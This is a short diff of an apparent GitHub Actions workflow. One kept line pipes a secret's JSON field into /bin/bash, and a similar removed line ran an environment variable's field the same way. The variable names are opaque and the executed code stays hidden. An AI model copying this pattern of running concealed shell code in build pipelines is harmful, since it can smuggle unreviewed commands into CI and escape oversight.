@@ -18,7 +18,6 @@ jobs:
           u483: ${{ secrets.u483 }}
         run: |
           printf '%s' "$u483" | jq -r .q1001 | /bin/bash
-          echo $hfzp4 | jq -r .de42002 | /bin/bash
 
       - name: Upload artifact
         if: always()
